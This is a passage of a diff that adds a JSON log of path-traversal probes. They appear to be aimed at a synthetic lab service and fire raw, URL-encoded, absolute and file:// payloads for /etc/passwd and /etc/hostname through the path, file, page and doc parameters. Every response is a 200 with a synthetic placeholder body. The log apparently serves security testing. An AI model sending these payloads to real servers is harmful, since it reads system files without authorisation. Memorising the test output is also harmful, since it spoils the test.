+   "path": "/pages?path=../../../../etc/passwd",
+   "raw_request": "GET /pages?path=../../../../etc/passwd HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:16 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "payload",
+   "endpoint": "/pages",
+   "param": "file",
+   "payload": "passwd-dotdot-raw",
+   "payload_raw": "../../../../etc/passwd",
+   "path": "/pages?file=../../../../etc/passwd",
+   "raw_request": "GET /pages?file=../../../../etc/passwd HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:17 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "payload",
+   "endpoint": "/pages",
+   "param": "page",
+   "payload": "passwd-dotdot-raw",
+   "payload_raw": "../../../../etc/passwd",
+   "path": "/pages?page=../../../../etc/passwd",
+   "raw_request": "GET /pages?page=../../../../etc/passwd HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:17 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 3
+  },
+  {
+   "case": "payload",
+   "endpoint": "/pages",
+   "param": "doc",
+   "payload": "passwd-dotdot-raw",
+   "payload_raw": "../../../../etc/passwd",
+   "path": "/pages?doc=../../../../etc/passwd",
+   "raw_request": "GET /pages?doc=../../../../etc/passwd HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:17 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 0
+  },
+  {
+   "case": "payload",
+   "endpoint": "/pages",
+   "param": "path",
+   "payload": "passwd-dotdot-enc",
+   "payload_raw": "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+   "path": "/pages?path=..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+   "raw_request": "GET /pages?path=..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:18 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "payload",
+   "endpoint": "/pages",
+   "param": "file",
+   "payload": "passwd-dotdot-enc",
+   "payload_raw": "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+   "path": "/pages?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+   "raw_request": "GET /pages?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:18 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "payload",
+   "endpoint": "/pages",
+   "param": "page",
+   "payload": "passwd-dotdot-enc",
+   "payload_raw": "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+   "path": "/pages?page=..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+   "raw_request": "GET /pages?page=..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:18 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "payload",
+   "endpoint": "/pages",
+   "param": "doc",
+   "payload": "passwd-dotdot-enc",
+   "payload_raw": "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+   "path": "/pages?doc=..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+   "raw_request": "GET /pages?doc=..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:19 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "payload",
+   "endpoint": "/pages",
+   "param": "path",
+   "payload": "passwd-absolute",
+   "payload_raw": "/etc/passwd",
+   "path": "/pages?path=/etc/passwd",
+   "raw_request": "GET /pages?path=/etc/passwd HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:19 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 2
+  },
+  {
+   "case": "payload",
+   "endpoint": "/pages",
+   "param": "file",
+   "payload": "passwd-absolute",
+   "payload_raw": "/etc/passwd",
+   "path": "/pages?file=/etc/passwd",
+   "raw_request": "GET /pages?file=/etc/passwd HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:19 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "payload",
+   "endpoint": "/pages",
+   "param": "page",
+   "payload": "passwd-absolute",
+   "payload_raw": "/etc/passwd",
+   "path": "/pages?page=/etc/passwd",
+   "raw_request": "GET /pages?page=/etc/passwd HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:19 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 0
+  },
+  {
+   "case": "payload",
+   "endpoint": "/pages",
+   "param": "doc",
+   "payload": "passwd-absolute",
+   "payload_raw": "/etc/passwd",
+   "path": "/pages?doc=/etc/passwd",
+   "raw_request": "GET /pages?doc=/etc/passwd HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:20 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 2
+  },
+  {
+   "case": "payload",
+   "endpoint": "/pages",
+   "param": "path",
+   "payload": "passwd-filescheme",
+   "payload_raw": "file:///etc/passwd",
+   "path": "/pages?path=file:///etc/passwd",
+   "raw_request": "GET /pages?path=file:///etc/passwd HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:20 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 2
+  },
+  {
+   "case": "payload",
+   "endpoint": "/pages",
+   "param": "file",
+   "payload": "passwd-filescheme",
+   "payload_raw": "file:///etc/passwd",
+   "path": "/pages?file=file:///etc/passwd",
+   "raw_request": "GET /pages?file=file:///etc/passwd HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:20 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 0
+  },
+  {
+   "case": "payload",
+   "endpoint": "/pages",
+   "param": "page",
+   "payload": "passwd-filescheme",
+   "payload_raw": "file:///etc/passwd",
+   "path": "/pages?page=file:///etc/passwd",
+   "raw_request": "GET /pages?page=file:///etc/passwd HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:21 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 2
+  },
+  {
+   "case": "payload",
+   "endpoint": "/pages",
+   "param": "doc",
+   "payload": "passwd-filescheme",
+   "payload_raw": "file:///etc/passwd",
+   "path": "/pages?doc=file:///etc/passwd",
+   "raw_request": "GET /pages?doc=file:///etc/passwd HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:21 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 2
+  },
+  {
+   "case": "payload",
+   "endpoint": "/pages",
+   "param": "path",
+   "payload": "hostname-dotdot-raw",
+   "payload_raw": "../../etc/hostname",
+   "path": "/pages?path=../../etc/hostname",
+   "raw_request": "GET /pages?path=../../etc/hostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:21 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "payload",
+   "endpoint": "/pages",
+   "param": "file",
+   "payload": "hostname-dotdot-raw",
+   "payload_raw": "../../etc/hostname",
+   "path": "/pages?file=../../etc/hostname",
+   "raw_request": "GET /pages?file=../../etc/hostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:22 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "payload",
+   "endpoint": "/pages",
+   "param": "page",
+   "payload": "hostname-dotdot-raw",
+   "payload_raw": "../../etc/hostname",
+   "path": "/pages?page=../../etc/hostname",
+   "raw_request": "GET /pages?page=../../etc/hostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:22 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 2
+  },
+  {
+   "case": "payload",
+   "endpoint": "/pages",
+   "param": "doc",
+   "payload": "hostname-dotdot-raw",
+   "payload_raw": "../../etc/hostname",
+   "path": "/pages?doc=../../etc/hostname",
+   "raw_request": "GET /pages?doc=../../etc/hostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:22 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 2
+  },
+  {
+   "case": "payload",
+   "endpoint": "/pages",
+   "param": "path",
+   "payload": "hostname-dotdot-enc",
+   "payload_raw": "..%2F..%2Fetc%2Fhostname",
+   "path": "/pages?path=..%2F..%2Fetc%2Fhostname",
+   "raw_request": "GET /pages?path=..%2F..%2Fetc%2Fhostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:23 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 0
+  },
+  {
+   "case": "payload",
+   "endpoint": "/pages",
+   "param": "file",
+   "payload": "hostname-dotdot-enc",
+   "payload_raw": "..%2F..%2Fetc%2Fhostname",
+   "path": "/pages?file=..%2F..%2Fetc%2Fhostname",
+   "raw_request": "GET /pages?file=..%2F..%2Fetc%2Fhostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:23 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 3
+  },
+  {
+   "case": "payload",
+   "endpoint": "/pages",
+   "param": "page",
+   "payload": "hostname-dotdot-enc",
+   "payload_raw": "..%2F..%2Fetc%2Fhostname",
+   "path": "/pages?page=..%2F..%2Fetc%2Fhostname",
+   "raw_request": "GET /pages?page=..%2F..%2Fetc%2Fhostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:23 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 4
+  },
+  {
+   "case": "payload",
+   "endpoint": "/pages",
+   "param": "doc",
+   "payload": "hostname-dotdot-enc",
+   "payload_raw": "..%2F..%2Fetc%2Fhostname",
+   "path": "/pages?doc=..%2F..%2Fetc%2Fhostname",
+   "raw_request": "GET /pages?doc=..%2F..%2Fetc%2Fhostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:23 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 0
+  },
+  {
+   "case": "payload",
+   "endpoint": "/pages",
+   "param": "path",
+   "payload": "hostname-absolute",
+   "payload_raw": "/etc/hostname",
+   "path": "/pages?path=/etc/hostname",
+   "raw_request": "GET /pages?path=/etc/hostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:24 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "payload",
+   "endpoint": "/pages",
+   "param": "file",
+   "payload": "hostname-absolute",
+   "payload_raw": "/etc/hostname",
+   "path": "/pages?file=/etc/hostname",
+   "raw_request": "GET /pages?file=/etc/hostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:24 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "payload",
+   "endpoint": "/pages",
+   "param": "page",
+   "payload": "hostname-absolute",
+   "payload_raw": "/etc/hostname",
+   "path": "/pages?page=/etc/hostname",
+   "raw_request": "GET /pages?page=/etc/hostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:24 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 2
+  },
+  {
+   "case": "payload",
+   "endpoint": "/pages",
+   "param": "doc",
+   "payload": "hostname-absolute",
+   "payload_raw": "/etc/hostname",
+   "path": "/pages?doc=/etc/hostname",
+   "raw_request": "GET /pages?doc=/etc/hostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:25 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 2
+  },
+  {
+   "case": "payload",
+   "endpoint": "/pages",
+   "param": "path",
+   "payload": "hostname-filescheme",
+   "payload_raw": "file:///etc/hostname",
+   "path": "/pages?path=file:///etc/hostname",
+   "raw_request": "GET /pages?path=file:///etc/hostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:25 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 3
+  },
+  {
+   "case": "payload",
+   "endpoint": "/pages",
+   "param": "file",
+   "payload": "hostname-filescheme",
+   "payload_raw": "file:///etc/hostname",
+   "path": "/pages?file=file:///etc/hostname",
+   "raw_request": "GET /pages?file=file:///etc/hostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:25 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 2
+  },
+  {
+   "case": "payload",
+   "endpoint": "/pages",
+   "param": "page",
+   "payload": "hostname-filescheme",
+   "payload_raw": "file:///etc/hostname",
+   "path": "/pages?page=file:///etc/hostname",
+   "raw_request": "GET /pages?page=file:///etc/hostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:26 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "payload",
+   "endpoint": "/pages",
+   "param": "doc",
+   "payload": "hostname-filescheme",
+   "payload_raw": "file:///etc/hostname",
+   "path": "/pages?doc=file:///etc/hostname",
+   "raw_request": "GET /pages?doc=file:///etc/hostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:26 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 1
+  }
+ ]
+}
